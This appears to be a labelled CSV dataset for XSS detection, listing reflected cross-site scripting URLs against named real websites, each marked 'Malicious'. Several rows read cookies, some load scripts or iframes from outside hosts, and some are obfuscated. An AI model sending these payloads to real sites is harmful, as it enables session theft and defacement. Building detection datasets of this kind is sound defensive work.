Payloads,Class
http://standards.ieee.org/%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xyl<br>itol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.musub.ch/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/<br>h1&gt;&lt;/marquee&gt;,Malicious
http://csc.lexum.umontreal.ca/scc-eliisa/?language=f%20%27%22%3e%3c/title%3e%3cscript%3ealert(%22xss<br>%22);%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e<br>r&amp;documentscope=judgment&amp;documentscope=news&amp;documentscope=bulletin&amp;all=+%27%22%3e%3c%2ftitle%3e%3csc<br>ript%3ealert(%22xss%22)%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss+by+xylitol%3c%<br>2fh1%3e%3c%2fmarquee%3e,Malicious
http://app.subscription.dell.com/prefcenter/reoptin.cfm?s=24014665&amp;e=rr@rr.com&amp;n=%22%3e%3cscript%3ea<br>lert%28document.cookie%29%3c/script%3e&amp;cl=,Malicious
"http://www.rockstargames.com/<script>alert(""xss by timse"")</script>",Malicious
http://www.marines.com/main/search?s=%3c/h1%3e%3cscript%3ealert(%22xss%20by%20mrdoug%22)%3c/script%3<br>e,Malicious
http://www.fcslovacko.cz/diskuse.php?forum='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarq<br>uee%3ewhitehat%20forever%3c/marquee%3e,Malicious
http://www.subway.ru/users/forget_do?forget_login=&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower/)%3<br>b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://script.starpass.fr/numero_pays_v3.php?pays=fr&amp;id_document=5600%27%22%3e%3c/title%3e%3cscript%<br>3ealert(1)%3c/script%3e,Malicious
http://www.banbooo.com/search.php?q=%3c%3cscript%3ealert(%22resistance%22)%3b%2f%2f%3c%3c%2fscript%3<br>e,Malicious
http://search.asan.go.kr/rss/front/rssresult.jsp?qt=%22%3e%3cscript%3ealert%28document.cookie%29%3c%<br>2fscript%3e%3e%3cmarquee%3e%3ch1%3eby%20kusomiso.com%3c%2fh1%3e%3c%2fmarquee%3e&amp;menu=%c5%eb%c7%d5%b0<br>%cb%bb%f6&amp;boxpage=standard.jsp&amp;adv=1&amp;x=0&amp;y=0,Malicious
http://filgoal.com/arabic/newssearch.asp?currsecid=0&amp;keyword=%22--%3e%3cscript%3ealert(%22xss%20vuln<br>erability%20was%20found%20by\n\nwww.intelcomms.net\n\nplease%20fix%22)%3c/script%3e%22--%3e,Malicious
http://uni14.ogame.de/game/redir.php?url=http://%3c%22%3c%3cscript%3ealert(document.cookie)%3c/scrip<br>t%3e,Malicious
http://www.hurriyetusa.com/haber/kategori.asp?kategori=%22%3e%3cbody+onload=alert(%22by%20encore%22)<br>%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://www.co.new-castle.de.us/ems/home/photos/login.asp?n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.fraudtheband.com/gb/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.billboardphotocontest.com/bin/emailcheck?email=%3cscript%3ealert(document.cookie)%3c/scri<br>pt%3e&amp;postback=true&amp;url=http%3a%2f%2fwww.billboardphotocontest.com%2fbin%2frate%3fimage_id%3d1008100<br>213,Malicious
http://msn.seek.co.nz/jobsearch/index.ascx?daterange=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;catlocation=1017&amp;st<br>ateselected=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;keywords=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;searchfrom=&quot;&gt;&lt;script&gt;al<br>ert(1)&lt;/script&gt;,Malicious
http://www.multan.gov.pk/page.php?data=%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.kleenagel.com/guest/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://citeseerx.ist.psu.edu/search;jsessionid=a1b943fe17d5cf91a7e5a59282d09f04?q=%22%3e%27%3e%3cscr<br>ipt%3ealert%28123%29%3c%2fscript%3e%22%27&amp;submit=search&amp;sort=date&amp;t=auth,Malicious
http://developer.apple.com/cgi-bin/search.pl?q=%3e%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e&amp;nu<br>m=10&amp;site=default_collection,Malicious
http://olhardigital.uol.com.br/?data=%22%3e%27%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthird<br>party%2fscripts%2fpython5.js%3e%3c%2fscript%3e,Malicious
http://zpravy.idnes.cz/kdo-ma-platit-u-lekare-vladni-politici-se-prou-fah-/domaci.asp?c=%22%3e%3cscr<br>ipt%3ealert('by%20encore')%3c/script%3e,Malicious
http://www.directgestion.fr/annonce-immobilier/annonces_photos_view.asp?announceid=1320274&amp;title=&lt;sc<br>ript&gt;alert(&quot;scriptorium(turkey)hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://christoffersflorist.com/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://uncyclopedia.wikia.com/index.php?title=special%3asearch&search=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3ba%28b%28%2fxss%2f.source%29%29%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss3d+by+hari%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://www.studystack.com/search.jsp?query=%27%22%3e%3ch1%3erubberduck%3c%2fh1%3e%3cbr%3e%3cbr%3e%3c<br>marquee%3ewhitehat+forever%3c%2fmarque%3e&amp;ok=find%21,Malicious
http://www.sonybmg.com/gm/search.do?q=%22%3e%3cscript%3ealert(/xssed/)%3c/script%3e&amp;select=network&amp;f<br>ront=f1001,Malicious
http://www.forever.schaudochmal.ch/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ultimateintern.monsterenergy.com/facebook/entries.php?search=%3c/script%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.prophet.net/quotes/search.jsp?returnfunction=&amp;searchstr=%27%22%3e%3ch1%3erubberduck%3c%2f<br>h1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewhitehat+forever%3c%2fmarque%3e,Malicious
http://myplay-games.org/?aid=5&amp;ps=dausue&amp;keywords=%3cscript%3ealert%28/xss/%29%3b%3c/script%3e,Malicious
http://stats.wwe.com/signup/signup.asp?error=24&amp;fn=arham&amp;ln=&quot;&gt;&lt;script&gt;alert(&quot;a rham<br>muhammad&quot;)&lt;/script&gt;&amp;email=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.junger-chor-goeggingen.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.wesecure.nl/zoekresultaten/?taal=nl&zoektext=%3cscript%3ealert%28%22xss%22%29%3c%2fscript%3e,Malicious
http://www.satcafesi.com/forum/redirector.php?url=%22%3e%3cscript%3ealert(2)%3c/script%3e,Malicious
http://retro.tattertools.com/ko/bbs/zboard.php?id=qna&amp;page=11&amp;select_arrange=headnum&amp;desc=asc&amp;catego<br>ry=&amp;sn=off&amp;ss=on&amp;sc=on&amp;keyword=&amp;sn1=&amp;divpage=2%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28<br>%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%3c%2f%73%<br>63%72%69%70%74%3e%0a,Malicious
http://datapool.nsstc.nasa.gov/noniemap.html?prod=bts&amp;inst=amsua&amp;plat=noaa15&amp;sd=2007/04/25&amp;ed='%22/%<br>3e%3c/%3e%3cscript%3ealert('xss')%3c/script%3e?&amp;dsn=amsua15sp,Malicious
http://smallbusiness.dnb.com/advance-search.asp?stype=name&amp;display=&amp;prodid=&amp;catalog=&amp;name=%27%22%3e%<br>3ch1%3erubberduck%3c%2fh1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewhitehat+forever%3c%2fmarque%3e&amp;city=%27%22<br>%3e%3ch1%3erubberduck%3c%2fh1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewhitehat+forever%3c%2fmarque%3e&amp;addr=%2<br>7%22%3e%3ch1%3erubberduck%3c%2fh1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewhitehat+forever%3c%2fmarque%3e&amp;sta<br>te=us&amp;country=us&amp;zipcode=%27%22%3e%3ch1%3erubberduck%3c%2fh1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewhitehat<br>+forever%3c%2fmarque%3e,Malicious
http://simcitysocieties.ea.com/index.php?languagecode=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3<br>c/script%3e,Malicious
http://entertainment.timesonline.co.uk/tol/sitesearch.do?x=0&amp;y=0&amp;query=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;<br>turnoffgoogleads=true&amp;submitstatus=searchformsubmitted&amp;mode=simple&amp;sectionid=980,Malicious
http://www.nycvisit.com/calendar/index.cfm?pagepkey=9&amp;eventtypefkey=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.serm.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h<br>1&gt;&lt;/marquee&gt;,Malicious
http://tpshop.ru/index.php?page_key=price_search&amp;group_id=0&amp;q=test%3c%2ftitle%3e%3cscript%3ealert%28<br>%27pappy+was+here%21%27%29%3b%3c%2fscript%3e&amp;in_mark=1&amp;in_title=1&amp;price_min=&amp;price_max=&amp;orderby=titl<br>e&amp;order=asc,Malicious
http://www.abstractsonline.com/errormessage.asp?errmesg=t%22%3e'%3e%3cscript%3ealert('xss')%3c/scrip<br>t%3e,Malicious
http://antonys.irk.ru/register.php?email=%3cscript%3ealert(document.cookie);%3c/script%3e%3e,Malicious
http://media.49abcnews.com/video/2006/04/16/biopsy.mp4&amp;amp;sa=x&amp;amp;oi=video_result&amp;amp;resnum=97&amp;am<br>p;ct=thumbnail&amp;amp;usg=afqjcnfohwgxusffdvfs2-1a_zjw09plzw%27%22%3e%3c/title%3e%3cscript%3ealert(1337<br>)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://js.cyberpolice.cn/webpage/search.jsp?%3fspec%3d0&amp;para=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61<br>%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%<br>32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2<br>c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;cry=,Malicious
http://www.piratamundo.com/intro.php?seccion=zonanoticias&amp;amp;page=%22%3e%3cscript%3ealert%28/ar3sw0<br>rmed/%29;%3c/script%3e,Malicious
http://z0ne-h.net/desifre/yorumekle.asp?id=44%22%3e%3cscript%3ealert(%22by%20st@rext%20xssed%22)%3c/<br>script%3e%3cmarquee%3e%3ch1%3eby%20st@rext%3c/h1%3e%3c/marquee%3e,Malicious
http://www.avast.com/resend-license.php?email='%22%3e%3cbody%20onload=alert(1)%3e,Malicious
"http://www.fao.org/waicent/portal/detail_event.asp?back=back&amp;lang=en&amp;event_id=%22%3e'%3e%3cscript%3e<br>alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.agc.buenosaires.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.mpfn.gob.pe/prensa-detalle.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious
http://multiply.com/?xurl=http%3a%2f%2fmultiply.com%2fgus%2fjournal%2fcompose%2faddthis%3fbody%3d%26<br>url%3dhttp%253a%252f%252fviewmorepics.myspace.com%252findex.cfm%253ffuseaction%253dviewimage%2526fri<br>endid%253d76777018%2526albumid%253d388788%2526imageid%253d23488168%26subject%3db%25c3%25a4b%25c3%25a<br>4mben%2bm%25c3%25b6chte%252c%2bdass%2bdu%2bdir%2bein%2bfoto%2bbei%2bmyspace%2bim%2balbum%2bmeine%2bf<br>otos%2bansieh%22%3e%3cscript%3ealert('xss')%3c/script%3et&amp;t=1208101168,Malicious
http://campus.milkcafe.net/test/read.cgi/%22%3e%3cbody%20onload%3dalert%28%27kusomiso%2ecom%27%29%3e,Malicious
http://www.transparencia.gov.br/portalcomprasdiretasedorgaosuperior.asp?ano=2007&amp;valor=3989669922864<br>4&amp;codigogd=2&amp;nomegd=amortiza%e7%e3o%20e%20juros%20da%20d%edvida&amp;codigoed=74&amp;nomeed=%3ch1%3exssed!%3c<br>script%3ealert(%22xss%22)%3c/script%3e&amp;valored=32370103346,Malicious
http://www.rei.com/search?query=%3c/script%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://www.rinunim.co.il/search.php?q=%3ciframe%20src=%22http://xssed.com%22%3e,Malicious
http://www.turismo.tandil.gov.ar/paginas/listado.php?categoriaid=%22%3c/script%3e%3cscript%3ealert%2<br>8document.cookie%29%3c/script%3e,Malicious
http://www.bilgicc.com/topic.asp?topic_id=63&amp;forum_id=18&amp;cat_id=1&amp;topic_title=&lt;script&gt;alert(document<br>.cookie)&lt;/script&gt;,Malicious
http://ssosoidao.chpho.go.th/main/guestbook/admin.php?id=3618%27%3e%22%3e%3ciframe%20src%3dhttp%3a%2<br>f%2fkusomiso%2ecom%2fxss%2ehtml%20%3c,Malicious
http://www.reactos.org/generated/doxygen/search.php?query=%27%22%3e%3cscript%3ealert%281337%29%3c%2f<br>script%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;btng=go,Malicious
http://www.toshibadirect.com/td/b2c/srch.to?stt=--%3e%3cscript%3ealert(%22hacker%20safe!%22)%3c%2fsc<br>ript%3e%3c!--+&amp;x=8&amp;y=14&amp;seg=hho,Malicious
http://search.eurofound.europa.eu/search?q=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert%281337%29%3c%2fs<br>cript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;site=default_collection&amp;bt<br>ng=search&amp;ie=&amp;output=xml_no_dtd&amp;client=default_frontend&amp;lr=&amp;proxystylesheet=default_frontend&amp;oe=utf-<br>8&amp;getfields=dc%252edate%252emodified&amp;curent_date=2008-06-08,Malicious
http://www.lichtzeichnungen.com/phpinfo.php?a[]=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://www.career-counseling.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.atk-kredi.gov.al/brenda.php?fq=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%<br>3ch1%3e%3cmarquee%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://whv.warnerbros.com/whvportal/portal/product.jsp?oid=___%3cscript%3ealert(%22xss%22)%3c/script<br>%3e___,Malicious
http://simcitysocieties.ea.com/community/forum/search.php?&amp;openitemid=%22%3e%3cscript%3ealert(/www.r<br>3t.n3t.nl/)%3c/script%3e,Malicious
"http://libguides.metro.org/searchtags.php?iid=&amp;tag=';alert(string.fromcharcode(88,83,83))//\';alert(<br>string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.fromcharcode<br>(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://nhic.mnr.gov.on.ca/areas/areas_report.cfm?areaid=4920%22%3e%3cscript%3ealert%28document.cooki<br>e%29%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%3c/h1%3e%3c/marquee%3e,Malicious
http://revistatrip.uol.com.br/conteudo.php?materia_id=%22%3e'%3e%3cscript%20src=http://vuln.xssed.ne<br>t/thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://pl.boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br>s.html%20%3c,Malicious
http://antigo.campinas.sp.gov.br/secoop/teste.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/sc<br>ript%3e,Malicious
http://onesearch.sun.com/search/docs/index.jsp?col=docs_en&amp;locale=en&amp;qt=&lt;%2ftextarea&gt;'&quot;&gt;&lt;script&gt;aler<br>t(document.cookie)&lt;%2fscript&gt;,Malicious
http://www.cxholidays.com/chl/r/dest/package/bkk?interest=cul-pur&amp;depd=19&amp;depym=20093&amp;whatby=package<br>&amp;search=1&amp;depcity=%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3e,Malicious
"http://www.unfpa.org/news/news.cfm?id=%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82<br>,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.saferoutesinfo.org/search/?searchbox=&quot;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&lt;iframe%2<br>0src=http://xssed.com&gt;,Malicious
http://search.oregon.gov/query.html?charset=iso-8859-1&amp;col=allore&amp;qc=allore&amp;qt=%22title%3e%3cscript%<br>3ealert(1337)%3c/script%22marque&amp;oldqt=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%<br>22%3e%3cmarquee,Malicious
http://ilsearch.rediff.com/ilsearch/default.asp?mt=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;mteng=xss&amp;prefilldata=[[/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;]]&amp;language=hindi,Malicious
http://www.placedelamode.com/search.php?q=%22%3e%3cscript%3ealert%28%27xss%27%29%3c/script%3e,Malicious
http://recruittalent.disney.com/fbnavbar/index.php?s=%3c/script%3e%3cimg%20src=x:x%20onerror=prompt%28document.cookie%29;%3e%3cscript%3e&fb=1,Malicious
http://notrefamille.femmes.fr.msn.com/v2/services-prenom/prenom.asp?prenom=&quot;&gt;&lt;body+onload=alert(&quot;sta<br>rext&quot;)&gt;&lt;marquee&gt;&lt;h1&gt;st@rext&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.onelook.com/cgi-bin/cgiwrap/bware/dofind.cgi?word=&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(document.cookie<br>);&lt;/script&gt;,Malicious
http://www.zerogamers.com/downloads.php?do=cat&amp;id=63%22%3e%3cscript%3ealert(%22critia!!%20vbulletin%<br>20xssed%20\ncookie%20editor%22)%3c/script%3e,Malicious
http://www.odevsitesi.com/g_arama.asp?kackayit=10&amp;r=3&amp;sayfa=1&amp;komut=1&amp;kelime=&quot;&gt;&lt;script&gt;alert(documen<br>t.cookie)&lt;/script&gt;,Malicious
http://www.dakamericas.com/newsdetail.php?id=%27%27%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/<br>script%3e,Malicious
http://myask.jp.ask.com/user/displaysignup?prod=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%<br>28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%3c%2f%7<br>3%63%72%69%70%74%3e%0a,Malicious
http://www.cpvo.europa.eu/default.php?res=1&amp;w=864&amp;h=510&amp;lang=en&amp;page=etxtusername=%27%22%3e%3c%2ftit<br>le%3e%3cscript%3ealert%281337%29%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%<br>2fmarquee%3e&amp;txtpassword=ssssssss&amp;txtmode=dologin&amp;login=loginmploi/annonces.html,Malicious
http://www.waterandwastewater.com/cgi-bin/cspoller/cspoller.cgi?cid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scrip<br>t&gt;,Malicious
http://www.nbflight.com/search.asp?field=title&amp;bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3<br>e&amp;smallclassname=&amp;keyword=xss&amp;submit=search,Malicious
http://www.2kaudit.ru/news.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%3e,Malicious
"http://developer.mozilla.org/special:tags?tag=&quot;/&gt;&lt;script&gt;alert(string.fromcharcode(88,%2083,%2083))&lt;<br>/script&gt;",Malicious
http://www.keine-festung-europa.eu/showpage.jsp?id='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3<br>e%3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://ms154.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://vdeck.com/help/walkthrough/menu.php?w=xss&quot;&gt;&lt;/script&gt;&lt;script&gt;alert('142teeth was<br>here.\n\nwhitehouse.net\naroundthebox.org')&lt;/script&gt;&lt;input type=&quot;hidden,Malicious
"http://www.palringo.com/en/gb/groups/search?search=<body+onload%3d""document.body.innerhtml%3d'<h1>04+hrb%2f<%2fh1>'%3b"">+<script>document.documentelement.innerhtml%3d""<h1>cybr040%40hotmail.com%2f<%2fh1>""%3b<%2fscript>&submit=",Malicious
http://www.newsvine.com/_tools/user/login?popoff&amp;redirect=%22%3e%3cscript%3ealert('xss');%3c/script%<br>3e%3c%22,Malicious
http://frab.math.cnrs.fr/index.php?n=main.wikisandbox?from=main.wikisandbox?from=%22/&gt;&lt;body<br>onload=alert(1)&gt;,Malicious
http://www.rainbowcamp.org/pgallery07/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious
http://www.dobado.com/aboutpc/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.nvidia.co.jp/content/driverdownload/download_confirmation_jp.asp?language=jp&amp;url=%22%3e%3<br>cscript%3ealert(/xss/)%3c/script%3e%3ca,Malicious
http://www.fairfaxcounty.gov/rim/incomedetail.asp?inctyp=%22%3e%3cbody+onload=alert(%22by%20encore%2<br>2)%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://search.canixs.com/search.php?query=%22%3e%27%3e%3cscript%3ealert(123)%3c/script%3e&amp;type=web&amp;z<br>ip=,Malicious
http://www.clasta.com//searchpage.cfm?keywords=%3e%22%3e%3cscript%3ealert%28%27xss%20-%20vuln%27%29%<br>3c%2fscript%3e,Malicious
http://www.schlangengrube.de/modules/inserate/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bestdownload.com/search.php?keyword=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/scrip<br>t%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.hit-reset.co.uk/?view=game&amp;id=%3cscript%3ealert%28%27xssedbygenocide%27%29%3c/script%3e,Malicious
http://www.stayfriends.se/j/viewcontroller?action=searchperson&amp;search=%3cscript%3ealert(123)%3c%2fsc<br>ript%3e&amp;searchschoolname=,Malicious
http://blog.synec.net/?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%<br>6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%3<br>2%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c<br>%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://www.viruslistjp.com/find?words=%22%3e%27%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2fscript%3e&amp;se<br>arch_mode=full,Malicious
http://www.csscorp.com/common/search-results.php?pageno=0&amp;save=1&amp;f_search=%3e%22%3e%3cscript%20%0a%0<br>d%3ealert(/xss%20by%20rohit/)%3b%3c/script%3e%3ch1%3exss%20by%20rohit%3c/h1%3e%3c/marquee%3e&amp;f_searc<br>h_submit=search,Malicious
http://www.mcseboard.de/windows-forum-lan-wan-32/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/sc<br>ript&gt;,Malicious
http://asia.cnet.com/tags/select/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarq<br>uee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%<br>3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e%27%22%3e%3c/title%3e%3<br>cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e/,Malicious
